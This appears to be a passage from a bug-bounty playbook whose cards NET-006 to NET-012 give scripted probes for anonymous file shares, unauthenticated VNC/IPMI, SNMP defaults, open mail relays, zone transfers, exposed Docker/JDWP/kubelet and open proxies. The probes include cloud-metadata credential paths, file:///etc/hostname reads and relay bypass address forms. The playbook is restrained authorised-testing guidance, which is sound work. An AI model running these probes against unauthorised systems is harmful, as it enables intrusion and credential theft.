  # SMB: the share list over a null session, then the root of each share except the administrative ones
  smbclient -N -L "//$H" 2>&1 | tee "$D/smb-shares.txt"; sleep "$W"
  for s in $(awk '$2 == "Disk" {print $1}' "$D/smb-shares.txt" | grep -vE '^([A-Z]|ADMIN|IPC|print)\$$'); do
    smbclient -N "//$H/$s" -c 'ls' 2>&1 | head -40 > "$D/smb-$s.txt"; echo "$s: $(head -1 "$D/smb-$s.txt")"; sleep "$W"
  done
  # NFS: the exports and who may mount them, then a listing without mounting
  showmount -e "$H" 2>&1 | tee "$D/nfs-exports.txt"; sleep "$W"
  nmap -Pn -n -T3 --max-rate "$PR" -p 111,2049 --script nfs-showmount,nfs-ls --script-args nfs-ls.maxfiles=20 -oN "$D/nfs-ls.txt" "$H"
  # rsync: the modules, then the top of each module
  rsync --list-only --contimeout=10 "rsync://$H/" 2>&1 | tee "$D/rsync-modules.txt"; sleep "$W"
  for m in $(awk '{print $1}' "$D/rsync-modules.txt" | grep -vE '^(@ERROR|rsync)'); do
    rsync --list-only --contimeout=10 "rsync://$H/$m/" 2>&1 | head -30 > "$D/rsync-$m.txt"; sleep "$W"
  done
  ```
  Stop at the listing. A write is tested only where the policy allows write tests and `ftp-anon` flagged a
  writeable directory: one empty file, listed, deleted, listed again. A marker that cannot be deleted goes into
  `cleanup.md` and to the operator.
  ```bash
  WD=incoming                          # the directory ftp-anon flagged writeable
  F="net006-$(date +%s).txt"; : > "$D/$F"
  curl -sS "${HDR[@]}" -m 20 --user 'anonymous:anonymous' -T "$D/$F" "ftp://$H/$WD/" -w '%{response_code} stored\n'
  curl -sS "${HDR[@]}" -m 20 --user 'anonymous:anonymous' "ftp://$H/$WD/" | grep -F "$F"
  curl -sS "${HDR[@]}" -m 20 --user 'anonymous:anonymous' -Q "DELE $WD/$F" -o /dev/null -w '%{response_code} deleted\n' "ftp://$H/"
  ```
- **Proof:** the anonymous access itself (`230` after `USER anonymous`, the null-session share list, an export to `*`
  or `(everyone)`, the module list) and the listing of the root with names, sizes and dates; for a write, the upload
  and delete replies with the marker's name. No file contents.
- **Not a finding when:** the server is a public download mirror (open-source releases, firmware or drivers the
  website links to). FTP takes `anonymous` and shows an empty or chrooted directory. SMB lists shares over a null
  session but every share answers `NT_STATUS_ACCESS_DENIED` (share names alone are `internal-info`); `IPC$` with a
  null session is normal Windows behaviour. An NFS export restricted to internal networks (showmount prints them and
  `nfs-ls` cannot read it). rsync modules that ask for a password (`@ERROR: auth failed on module`). A hosting
  company's FTP on a shared address (NET-001).
- **Escalate:** nothing is downloaded to "check" it: a name that says backup, dump, `.sql`, `.bak`, `id_rsa`, `.env`
  or `wp-config` is reported from its name and size, and a credential read by accident follows INF-002's
  one-identity-call rule. An anonymous write into a directory the web server on the same address serves (the
  listing matches a web path) is reported from the removed marker, never with a script. An NFS export with
  `no_root_squash`, or an SMB share open to guest writes, is described, not used.

### NET-007 · A VNC desktop, Telnet shell, X display or BMC on this address accepts a session without credentials

| | |
|---|---|
| **Severity** | Critical standalone when a desktop, display, shell or BMC takes a session with no credentials at all; High for a BMC whose IPMI accepts cipher suite 0; Low for a cleartext login prompt, which most programmes close |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #194454, #187025, #62531 |

- **Where:** ports NET-002 named vnc (5900 to 5910), telnet (23, 2323, and router CLIs on 2601 to 2605), X11 (6000
  to 6005) and asf-rmcp (IPMI, 623/udp), plus BMC web interfaces (iDRAC, iLO, Supermicro) on management addresses.
  SSH and RDP are not here: both ask for credentials, and guessing them is brute force.
- **Test:** read what the service offers before anything is typed: the RFB security types (type 1 is None), the
  first thing a Telnet service prints (a shell or CLI prompt, or `login:`), whether the X server lets an unknown
  client open the display, the IPMI authentication capabilities and cipher 0.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-007"; mkdir -p "$D"; PR=$(awk -v r="$RATE" 'BEGIN{n=int(r*10); print (n<1?1:n)}')
  # VNC: the security types each port offers; 'None' means no password
  nmap -Pn -n -T3 --max-rate "$PR" -p 5900-5910 --script vnc-info -oN "$D/vnc-info.txt" "$H"
  # Telnet: what the service prints in eight seconds with nothing typed
  timeout 12 sh -c 'sleep 8 | telnet "$1" 23' sh "$H" 2>&1 | tr -d '\000' | head -25 | tee "$D/telnet.txt"
  # X11: can an unknown client open display :0 (port 6000)? The header only: no xwd, no xinput, no xdotool
  timeout 10 xdpyinfo -display "$H:0" 2>&1 | head -8 | tee "$D/x11.txt"
  # IPMI: authentication capabilities and cipher suite 0 (UDP, so root); no RAKP hash request, no session
  sudo nmap -Pn -n -sU -T3 --max-rate "$PR" -p 623 --script ipmi-version,ipmi-cipher-zero -oN "$D/ipmi.txt" "$H"
  ```
  Where `vnc-info` lists `None`, read the desktop name and size from ServerInit and disconnect: one shared session
  (anyone already connected stays connected), no framebuffer request, no input event.
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-007"; VP=5900        # the port vnc-info showed with None
  python3 - "$H" "$VP" <<'PY' | tee "$D/vnc-serverinit.txt"
  import socket, struct, sys
  s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=8)
  def rx(n):
      b = b""
      while len(b) < n:
          c = s.recv(n - len(b))
          if not c:
              raise SystemExit("closed after %d bytes" % len(b))
          b += c
      return b
  ver = rx(12); print("server", ver.decode("latin-1").strip())
  if ver[4:11] == b"003.003":
      s.sendall(b"RFB 003.003\n"); t = struct.unpack(">I", rx(4))[0]; print("security type", t)
      if t != 1:
          raise SystemExit("authentication required or refused")
  else:
      mine = b"RFB 003.007\n" if ver[4:11] == b"003.007" else b"RFB 003.008\n"
      s.sendall(mine); n = rx(1)[0]
      if n == 0:
          raise SystemExit("refused: " + rx(struct.unpack(">I", rx(4))[0]).decode("latin-1"))
      types = list(rx(n)); print("security types", types)
      if 1 not in types:
          raise SystemExit("authentication required")
      s.sendall(b"\x01")
      if mine == b"RFB 003.008\n" and struct.unpack(">I", rx(4))[0] != 0:
          raise SystemExit("refused after None")
  s.sendall(b"\x01")                     # ClientInit with the shared flag set
  w, h = struct.unpack(">HH", rx(4)); rx(16)
  print("desktop %dx%d name %r" % (w, h, rx(struct.unpack(">I", rx(4))[0]).decode("latin-1")))
  PY
  ```
  The script exits after ServerInit, which closes the connection. Stop at the banner: no keystroke, no screenshot,
  no command, no login.
- **Proof:** VNC: `vnc-info` listing `None` and the ServerInit desktop name and size. Telnet: a shell or CLI prompt
  (`#`, `$`, `Router>`, `BusyBox v1.x built-in shell`) printed with no login exchanged. X11: `xdpyinfo`'s `name of
  display` and `vendor string`. IPMI: `ipmi-version`'s capabilities and `ipmi-cipher-zero` reporting the cipher
  accepted. Say what the session would allow (watch and type on the desktop, run commands, read keystrokes from the
  display, power-cycle the server and open its console) and that nothing was done.
- **Not a finding when:** VNC offers only type 2 (VNC authentication) or vendor types (16, 18, 19, 30 and up): a
  password prompt, and guessing it needs `bruteforce-ok`. Telnet prints `login:` or `Password:`: a cleartext login
  service, Low at most and often closed (`mitm`; #194454 carries no bounty). X11 answers `Authorization required`
  or `unable to open display`. IPMI answers capabilities only and refuses cipher 0: an exposed BMC worth a line in
  the notes, rarely paid alone. RDP and SSH asking for credentials (with NLA off, RDP shows only the logon screen).
  A honeypot: VNC with None on an address with twenty other open services, a desktop named like a lure.
- **Escalate:** vendor default credentials on a BMC or router login (`root`/`calvin` on iDRAC; a router's vty
  password, as in #62531, $200) are CVE-007's card: the vendor pair only, a few attempts. Never ask an IPMI 2.0 BMC
  for RAKP hashes (the protocol hands any client a salted password hash for a valid user name, to crack offline)
  and never open a session with cipher 0: the capability is the proof. A BMC's web interface and firmware version
  go to CVE-008 and CVE-012 (#187025 was an iDRAC reachable from the internet).

### NET-008 · The SNMP agent on this address answers the community `public` and hands out its system and network tables

| | |
|---|---|
| **Severity** | Medium standalone when `public` reads more than the system group: interfaces, the neighbour table, routes, running processes or local accounts; High when the read-write default `private` also answers; Low for the system description alone (`version-disclosure`) |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Use of Default Credentials · CWE-1392 |
| **Prior art** | #455726, #797988 |

- **Where:** 161/udp from NET-002's UDP probe: routers, switches, firewalls, printers, BMCs, and Windows or Linux
  servers running an SNMP agent. Only the two default community names are tried; a list of guesses is brute force
  and needs `bruteforce-ok`.
- **Test:** SNMP v1 and v2c authenticate with the community string alone, and `public` (read) and `private` (often
  read-write) are the defaults. One GET for the system group, a control with a random community, then one GETBULK
  per table to see whether it is readable, counting rows without keeping values.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  SYS='1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.3.0 1.3.6.1.2.1.1.4.0 1.3.6.1.2.1.1.5.0 1.3.6.1.2.1.1.6.0'   # sysDescr sysUpTime sysContact sysName sysLocation
  for v in 2c 1; do
    snmpget -v "$v" -c public -t 3 -r 1 -On "$H" $SYS 2>&1 | tee "$D/system-v$v.txt"; sleep "$W"
    grep -qE 'STRING|Timeticks' "$D/system-v$v.txt" && break
  done
  # control: an agent that answers a random community accepts anything (or is a honeypot)
  snmpget -v2c -c "sane$RANDOM" -t 3 -r 1 -On "$H" 1.3.6.1.2.1.1.5.0 2>&1 | tee "$D/control.txt"; sleep "$W"
  # one GETBULK of 25 rows per table: readable or not, and how many rows answer; values are counted, not kept
  for t in 1.3.6.1.2.1.2.2.1.2:interfaces 1.3.6.1.2.1.4.22.1.2:neighbours 1.3.6.1.2.1.4.21.1.1:routes \
           1.3.6.1.2.1.25.4.2.1.2:processes 1.3.6.1.2.1.25.6.3.1.2:installed-software 1.3.6.1.4.1.77.1.2.25:windows-accounts; do
    o=${t%%:*}; n=$(snmpbulkget -v2c -c public -t 3 -r 1 -On -Cn0 -Cr25 "$H" "$o" 2>/dev/null | grep -c "^\.$o\.")
    echo "${t#*:} $n"; sleep "$W"
  done | tee "$D/tables.txt"
  # the read-write default, asked with a GET only. Never snmpset, not even to the value it already holds
  snmpget -v2c -c private -t 3 -r 1 -On "$H" 1.3.6.1.2.1.1.5.0 2>&1 | tee "$D/private.txt"
  ```
  Stop at the system group and the row counts.
- **Proof:** the GET with `public` and its answer (`sysDescr`, `sysName`, `sysLocation`, `sysContact`), the control
  refused, the table counts (for example `neighbours 25`, `processes 25`), and for `private` the GET and its
  answer. A row count of 25 means at least 25: one GETBULK reads no further.
- **Not a finding when:** neither `public` nor `private` answers over v1 or v2c (closed, or SNMPv3 only: an SNMPv3
  engine id from nmap's `snmp-info` is not access). The random community answers too (an agent that accepts
  anything, often a honeypot: report the behaviour, not `public`). Only `sysDescr` answers (`version-disclosure`):
  most programmes close it. The agent is the ISP's or hosting company's device on the path (`sysContact` and
  `sysName` name the provider; NET-001).
- **Escalate:** never `snmpset`. Interfaces, neighbours and routes name internal addresses: inputs for SSR-010 and
  NET-012, and `internal-info` alone. On Cisco gear a read-write community can make the device copy its
  configuration to a TFTP server we name (`CISCO-CONFIG-COPY-MIB`): describe it, never send the SET. An agent on a
  BMC or printer points at its web login: NET-007 and CVE-007.

### NET-009 · The SMTP server on this address relays mail from an outside sender to an outside recipient without authentication

| | |
|---|---|
| **Severity** | Medium standalone for one message delivered from an outside sender to our own outside mailbox; High when the relay sits inside an in-scope domain's SPF record, so relayed mail in that domain's name passes SPF |
| **Requires** | nonweb-ports, oob |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-441 |
| **Prior art** | #144385, #138315, #183548 |

- **Where:** ports NET-002 named smtp (25), submission (587) and smtps (465). Mail exchangers (`dig +short MX` of the
  in-scope domains) are rarely open; application servers and appliances with their own MTA on a public address are
  the usual relays. #144385 is the only title in the index that names a relay; the two paid LocalTapiola SMTP
  reports (#138315, $300; #183548, $100) do not say which misconfiguration they found.
- **Test:** an MTA accepts mail for its own domains from anyone (that is an MX's job); it must not accept mail from
  an outside sender to an outside recipient unless the client authenticated or sits on a trusted network. Ask at
  `RCPT` first, without sending a message. Send one message only after a `250` to `RCPT`, from and to the callback
  domain, so nobody but us receives it. The policy must allow sending one test message.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-009"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  DOM=$(jq -r '.in[] | select(.type == "domain" or .type == "wildcard") | .value | sub("^\\*\\."; "")' "$E/scope.json" | head -1)   # an in-scope domain this server receives for
  # 1. RCPT only, no message: does it take an outside recipient from an outside sender? (again with --port 587, and --port 465 --tlsc)
  swaks --server "$H" --port 25 --ehlo "$OOB" --from "net009@$OOB" --to "net009@$OOB" --quit-after RCPT --timeout 20 2>&1 | tee "$D/rcpt-25.txt"; sleep "$W"
  # 2. refused? the old relay-check bypass address forms, still RCPT only
  for r in "net009%$OOB@$DOM" "\"net009@$OOB\"@$DOM" "@$DOM:net009@$OOB" "$OOB!net009@$DOM"; do
    echo "== $r"; swaks --server "$H" --port 25 --ehlo "$OOB" --from "net009@$OOB" --to "$r" --quit-after RCPT --timeout 20 2>&1 | tail -3; sleep "$W"
  done | tee "$D/rcpt-forms.txt"
  ```
  ```bash
  # 3. one message, only after a 250 to RCPT above, to our callback domain; then the interactsh log shows an SMTP interaction from the relay
  swaks --server "$H" --port 25 --ehlo "$OOB" --from "net009@$OOB" --to "net009@$OOB" \
    --header "Subject: NET-009 relay test via $H" --body "Bug bounty test of an open relay at $H, sent to the tester's own domain. No action needed." \
    --timeout 30 2>&1 | tee "$D/data-25.txt"
  # 4. is the relay inside an in-scope domain's SPF? An ip4: range covering it, 'a', or 'mx' with the relay among the MX hosts
  for d in $(jq -r '.in[] | select(.type == "domain" or .type == "wildcard") | .value | sub("^\\*\\."; "")' "$E/scope.json" | sort -u); do
    printf '%s: %s\n' "$d" "$(dig +short TXT "$d" | grep -i 'v=spf1' | tr -d '"')"; sleep 0.2
  done | tee "$D/spf.txt"
  ```
  Stop after the one message: no second message, no other recipient, no volume.
- **Proof:** the `RCPT` transcript with `250` for an outside recipient from an outside sender, the one message's
  transcript, and the interactsh record of that message arriving from the relay's address with the subject above.
  For High, the SPF record that authorises the relay.
- **Not a finding when:** `250` to `RCPT` and no delivery: some MTAs accept and then drop or bounce, and a bounce
  from the relay to our domain says it refused after all. `530 Authentication required` or `554 Relay access
  denied`. An MX accepting mail for its own domains from anyone, and a spoofed sender of the organisation's own
  domain to the organisation's users, are `spf-dmarc` territory and would need a recipient at the organisation,
  which this card never mails. Relaying only after `AUTH`. A mail provider's server (SendGrid, Mailgun, Microsoft
  365, Google) that the organisation merely uses (`third-party`). `VRFY` or `EXPN` answering (`user-enum`; #193314).
  No STARTTLS or an old TLS version (`ssl-tls`).
- **Escalate:** for High, ask the operator for a mailbox of their own and send one more message to it with `--from
  net009@$DOM`: its `Authentication-Results` header shows `spf=pass` for the organisation's domain. Never send to a
  third party. A relay reached through an application's contact or invite form is CRL-007's (header injection into
  the organisation's own mail).

### NET-010 · The name server on this address hands a full zone transfer to an unknown client

| | |
|---|---|
| **Severity** | Low standalone when every name in the zone is already public; Medium when the zone lists hosts no public source names (internal, staging, VPN or management names, private addresses) and one of them leads to another finding |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Information Disclosure · CWE-200 |
| **Prior art** | #137093 |

- **Where:** addresses where NET-002 found `domain` (53/tcp and 53/udp): the programme's own name servers (`dig +short
  NS` of the in-scope domains), hidden primaries named only in the SOA, and DNS servers on CIDR ranges. Third-party
  DNS hosts (Route 53, Cloudflare, Azure DNS, NS1, Akamai) refuse transfers and are not the programme's.
- **Test:** AXFR is meant for the zone's secondaries; a server should refuse anyone else. Ask SOA without recursion
  to see which in-scope zones the server is authoritative for, then request one AXFR of each, and of the reverse
  zone of the address's /24.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-010"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  IP=$(case "$H" in *[!0-9.]*) dig +short A "$H" | head -1 ;; *) echo "$H" ;; esac)
  { jq -r '.in[] | select(.type == "domain" or .type == "wildcard") | .value | sub("^\\*\\."; "")' "$E/scope.json"
    echo "$IP" | awk -F. 'NF == 4 {print $3"."$2"."$1".in-addr.arpa"}'; } | sort -u > "$D/zones.txt"
  while read -r z; do
    if dig @"$H" "$z" SOA +norecurse +time=5 +tries=1 | grep -qE 'flags:[^;]* aa'; then
      dig @"$H" "$z" AXFR +time=10 +tries=1 > "$D/axfr-$z.txt"
      echo "$z: $(grep -cvE '^(;|$)' "$D/axfr-$z.txt") records"
    else echo "$z: not authoritative here"; fi
    sleep "$W"
  done < "$D/zones.txt" | tee "$D/summary.txt"
  # the names only the transfer revealed: not yet an asset
  awk '!/^;/ && NF {print tolower($1)}' "$D"/axfr-*.txt 2>/dev/null | sed 's/\.$//' | sort -u > "$D/axfr-names.txt"
  jq -r 'keys[]' "$E/assets.json" | sort -u > "$D/known.txt"
  comm -23 "$D/axfr-names.txt" "$D/known.txt" > "$D/new-names.txt"; wc -l < "$D/new-names.txt"
  ```
  One AXFR per zone, and stop there: the transfer is the banner. The new names are recon; the in-scope ones become
  assets: `scripts/sane asset add $(scripts/sane scope filter < "$D/new-names.txt")`.
- **Proof:** the SOA answer with the `aa` flag, the AXFR command and its first lines (the SOA serial and the record
  count), saved raw, and the names only the transfer revealed (`new-names.txt`, compared with what recon and
  certificate transparency already had). TXT values are cut in the report: verification tokens and notes sit there.
- **Not a finding when:** `; Transfer failed.`, `REFUSED` or `NOTAUTH`. The server is a DNS provider's
  (`third-party`). Every name is already public: the report adds nothing and is closed as informative
  (`internal-info`). A zone the organisation publishes on purpose (some registries and open-data zones allow
  transfers). An open resolver (`dig @$H example.org A` answered with the `ra` flag) is a separate graveyard entry
  (`dos`).
- **Escalate:** in-scope new names are fingerprinted like any other asset; private addresses and internal names are
  what NET-012's relays and SSR-010 are asked for (an internal name through an open proxy is #2967634's shape);
  names on third-party services and released cloud addresses go to STO-001 and STO-007.

### NET-011 · A Java debug or management port, a Docker daemon or a kubelet on this address answers a read-only call without authentication

| | |
|---|---|
| **Severity** | Critical standalone: JDWP, JMX without authentication, the Docker Engine API and a kubelet that admits anonymous requests run code by design, and the read-only answer is the proof; High when only the RMI registry answers and the JMX endpoint it names cannot be reached from outside |
| **Requires** | nonweb-ports |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #703910, #49408, #366638, #1456063 |

- **Where:** ports NET-002 named jdwp (5005, 8000, 8787 and 9009 are common; `-sV` recognises the `JDWP-Handshake`
  echo on any port), java-rmi (1099, 1098, 9010, 9999, and 7199 on Cassandra), docker (2375 plain, 2376 with TLS) and
  kubelet (10250 over HTTPS, 10255 read-only over HTTP). The Kubernetes API (6443), etcd (2379) and container
  registries are CLD-012's and are not repeated here.
- **Test:** each protocol has one call that only reads: JDWP `VirtualMachine.Version` after the handshake, the RMI
  registry's bound names and one JMX attribute (`java.lang:type=Runtime`), Docker `/version` and `/info`, kubelet
  `/pods` counted. A configured deployment refuses each of them or never exposes the port.
- **How:**
  ```bash
  # JDWP: the handshake, then the Version command of the VirtualMachine command set (set 1, command 1). Nothing else is sent
  source "$E/env.sh"; D="$E/evidence/$H/NET-011"; mkdir -p "$D"; JP=5005        # or the port NET-002 listed for jdwp
  python3 - "$H" "$JP" <<'PY' | tee "$D/jdwp.txt"
  import socket, struct, sys
  s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=8)
  def rx(n):
      b = b""
      while len(b) < n:
          c = s.recv(n - len(b))
          if not c:
              raise SystemExit("closed after %d bytes" % len(b))
          b += c
      return b
  s.sendall(b"JDWP-Handshake"); hs = rx(14); print("handshake", hs)
  if hs != b"JDWP-Handshake":
      raise SystemExit("not JDWP")
  s.sendall(struct.pack(">IIBBB", 11, 1, 0, 1, 1))
  length, _, _, err = struct.unpack(">IIBH", rx(11)); body = rx(length - 11)
  if err:
      raise SystemExit("JDWP error %d" % err)
  def jstr(b, o):
      n = struct.unpack(">I", b[o:o + 4])[0]
      return b[o + 4:o + 4 + n].decode("utf-8", "replace"), o + 4 + n
  desc, o = jstr(body, 0); o += 8; ver, o = jstr(body, o); name, o = jstr(body, o)
  print("vm:", name, ver, "|", desc.splitlines()[0] if desc else "")
  PY
  ```
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-011"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  PR=$(awk -v r="$RATE" 'BEGIN{n=int(r*10); print (n<1?1:n)}'); RP=1099; DP=2375      # or the ports NET-002 listed
  # RMI registry: the bound names; 'jmxrmi' is a JMX connector
  nmap -Pn -n -T3 --max-rate "$PR" -p "$RP" --script rmi-dumpregistry -oN "$D/rmi-registry.txt" "$H"
  # JMX: one attribute read with no credentials (jmxterm release jar, non-interactive). No 'run', no MLet, no 'set'
  echo 'get -b java.lang:type=Runtime VmName VmVersion' | timeout 30 java -jar jmxterm-1.0.4-uber.jar -l "$H:$RP" -n -v silent 2>&1 | tee "$D/jmx.txt"; sleep "$W"
  # Docker Engine API: version and a summary of /info. GET only
  curl -sS "${HDR[@]}" -m 10 "http://$H:$DP/version" | jq -c '{Version, ApiVersion, Os, KernelVersion}' | tee "$D/docker-version.json"; sleep "$W"
  curl -sS "${HDR[@]}" -m 10 "http://$H:$DP/info" | jq -c '{Name, Containers, ContainersRunning, Images, ServerVersion, Swarm: .Swarm.LocalNodeState}' | tee "$D/docker-info.json"; sleep "$W"
  curl -sSk "${HDR[@]}" -m 10 -o /dev/null -w '%{http_code} on 2376 without a client certificate\n' "https://$H:2376/version"; sleep "$W"
  # kubelet: the pod count and namespace names; everything after this is CLD-012's
  curl -sSk "${HDR[@]}" -m 10 "https://$H:10250/pods" | jq -r '"pods: \(.items | length)", ([.items[].metadata.namespace] | unique | join(" "))' 2>&1 | tee "$D/kubelet.txt"; sleep "$W"
  curl -sS "${HDR[@]}" -m 10 "http://$H:10255/pods" | jq -r '"read-only port pods: \(.items | length)"' 2>&1 | tee -a "$D/kubelet.txt"
  ```
  Stop at the banner: no breakpoint and no suspend (either can freeze the application), no MBean operation, no
  container create, no `exec`, `run` or `attach`.
- **Proof:** JDWP: the handshake echo and the VM name and version. RMI: the bound names (`jmxrmi` and the endpoint
  its stub names). JMX: `VmName` and `VmVersion` read with no credentials. Docker: `/version` and the `/info` summary
  (host name, container and image counts). Kubelet: the pod count and namespace names. State what each allows
  (JDWP: load and run any class in the JVM; JMX: load an MBean from a URL or call diagnostic operations; Docker:
  start a privileged container that mounts the host; kubelet: `exec` into any pod on the node) and that none of it
  was attempted.
- **Not a finding when:** JMX answers `Authentication failed! Credentials required`. The RMI registry binds only
  application objects, not `jmxrmi`: a deserialization question for DSR-003, and current JVMs filter registry
  input. The stub names an internal address and the JMX port behind it is closed from outside (`internal-info`; the
  High row of Severity at most). A JDWP port that drops right after the handshake (a debugger is already attached:
  try once later). Docker on 2376 refuses a client without a certificate. A socket proxy in front of Docker answers
  `/version` and 403 for the rest: report only what answers. The kubelet answers `401 Unauthorized` (webhook
  authentication working). A honeypot: Docker honeypots answer `/version` with the same old release on many
  addresses.
- **Escalate:** no exploitation is needed and none is done: these interfaces execute code by design, and programmes
  pay for the read-only answer (#703910, $2,000 for JMX over RMI on a bare address; #49408, $300 for JDWP). The
  kubelet, the Kubernetes API, etcd and registries continue in CLD-012; Docker and kubelet over HTTP are also
  CVE-008 rows: run one card and reference it in the other's note. An old JVM in the version string → CVE-002.
  #366638 reached a Docker API through an SSRF ($500): the same daemon behind a firewall is SSR-003's loopback
  target. #1456063 is NET-001's lesson: the JMX server it reached was on an address Basecamp no longer held.

### NET-012 · A proxy, TURN relay or browser grid on this address forwards our connection into the organisation's network

| | |
|---|---|
| **Severity** | High standalone when the relay returns a response from an internal-only host, a loopback service or the cloud metadata service; Critical when the metadata answer names an instance role (stated, never used); Low to Medium when it reaches only the internet (an open proxy that puts our traffic behind the organisation's address) |
| **Requires** | nonweb-ports\|http |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #2967634, #333419, #512973, #843256 |

- **Where:** ports NET-002 named http-proxy, squid-http, socks5 (1080), a Fiddler or other developer proxy (8888 and
  arbitrary ports, as #1088975's 7459), turn or stun (3478 over UDP and TCP, 5349 with TLS, often 443), and a
  Selenium grid or Selenoid (4444; `/status` or `/wd/hub/status`). TURN credentials come from the application itself:
  its WebRTC or ICE configuration hands time-limited TURN credentials to any caller or to account A.
- **Test:** a relay that does not restrict its destinations is an SSRF that needs no bug in any application. Ask it
  for our callback host first (does it relay at all?), then for an address that cannot exist (the control),
  loopback, the metadata service and a few internal-only names from recon, and compare each answer with the control.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/NET-012"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  PP=3128; SP=1080      # or the ports NET-002 listed for the HTTP proxy and SOCKS
  # internal-only names from recon: in-scope names whose A record is a private address (NET-010's new names belong here too)
  jq -r 'to_entries[] | select(.value.in_scope) | .key' "$E/assets.json" | grep -vE '^[0-9.]+$' | while read -r n; do
    dig +short A "$n" | grep -qE '^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)' && echo "$n"; sleep 0.2
  done | head -5 > "$D/internal-names.txt"
  # HTTP proxy, GET only: callback, control, loopback, metadata role list, internal names; status and size, bodies saved
  for u in "http://$OOB/net012-proxy" "http://10.255.255.1:9/" "http://127.0.0.1/" \
           "http://169.254.169.254/latest/meta-data/iam/security-credentials/" $(sed 's#^#http://#; s#$#/#' "$D/internal-names.txt"); do
    printf '%s -> ' "$u"
    curl -sS "${HDR[@]}" -m 10 -x "http://$H:$PP" -o "$D/px-$(printf %s "$u" | md5sum | cut -c1-8).body" -w '%{http_code} %{size_download}\n' "$u"
    sleep "$W"
  done | tee "$D/proxy.txt"
  # SOCKS: callback and loopback
  for u in "http://$OOB/net012-socks" "http://127.0.0.1/"; do
    printf '%s -> ' "$u"; curl -sS "${HDR[@]}" -m 10 --socks5-hostname "$H:$SP" -o /dev/null -w '%{http_code} %{size_download}\n' "$u"; sleep "$W"
  done | tee "$D/socks.txt"
  ```
  ```bash
  # TURN (stunner, github.com/firefart/stunner): server software, then whether it relays to loopback, private and metadata ranges.
  # turn.env holds TURN_USER and TURN_PASS copied from the application's ICE server list for our own session
  source "$E/env.sh"; D="$E/evidence/$H/NET-012"; source "$E/accounts/turn.env"; TP=3478
  stunner info -s "$H:$TP" 2>&1 | tee "$D/turn-info.txt"
  stunner range-scan -s "$H:$TP" -u "$TURN_USER" -p "$TURN_PASS" 2>&1 | tee "$D/turn-range.txt"      # a few dozen permission requests, once
  ```
  ```bash
  # Selenium grid or Selenoid: status, one session whose browser loads our callback and /etc/hostname, then the session is deleted
  source "$E/env.sh"; D="$E/evidence/$H/NET-012"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); GP=4444; G="http://$H:$GP/wd/hub"
  curl -sS "${HDR[@]}" -m 10 "$G/status" | head -c 300; echo; sleep "$W"
  SID=$(curl -sS "${HDR[@]}" -m 90 -X POST "$G/session" -H 'Content-Type: application/json' \
    -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}' | jq -r '.value.sessionId // .sessionId // empty'); echo "session $SID"
  for u in "http://$OOB/net012-grid" "file:///etc/hostname"; do
    curl -sS "${HDR[@]}" -m 30 -X POST "$G/session/$SID/url" -H 'Content-Type: application/json' -d "{\"url\":\"$u\"}" -o /dev/null; sleep "$W"
    curl -sS "${HDR[@]}" -m 30 "$G/session/$SID/source" | jq -r '.value' | head -c 200; echo
  done | tee "$D/grid.txt"
  curl -sS "${HDR[@]}" -m 30 -X DELETE "$G/session/$SID" -o /dev/null -w '%{http_code} session deleted\n'
  ```
  Grid 4 answers without the `/wd/hub` prefix: set `G="http://$H:$GP"`. Stop at the first internal answer: its status,
  size and title, or the metadata role name; never the credential document under it (SSR-003's rule).
- **Proof:** the relayed request and the internal answer next to the control's, with status and size: a loopback
  page title, the metadata role name, an internal host's title. For TURN, the `range-scan` lines that allowed a
  loopback, private or metadata peer. For a grid, the callback from the grid's browser, `/etc/hostname` in the page
  source, and the deleted session.
- **Not a finding when:** the "proxy" is the site's own reverse proxy: absolute-URI requests return the site's own
  page for every destination (the same size as the control and as a direct request). `407 Proxy Authentication
  Required`. CONNECT only to the site's own 443. A relay that reaches the internet and refuses every private,
  loopback and metadata destination: an open proxy, Low to Medium, and many programmes close it. TURN answering
  `403 Forbidden` for private peers (coturn's `denied-peer-ip` and `no-loopback-peers` working): relaying to public
  peers is what TURN is for. A grid that asks for credentials (Selenoid behind htpasswd, Grid 4 with basic
  authentication). A developer's proxy on an address that is not the programme's (NET-001).
- **Escalate:** one internal title or the metadata role name is enough; SSR-003's and SSR-010's limits apply in full
  (a few dozen requests, no sweep of a /16). #2967634's proxy paid $7,500 for internal Reddit domains: internal names
  are what a relay is asked for, and NET-010's transfers and the private-address names above are where they come
  from. A TURN relay to the metadata service is #333419; an open TURN relay without the internal reach paid $700
  (#843256). A grid's browser also renders `file://` (#512973: local files and SSRF): one file name, `/etc/hostname`.

## Graveyard

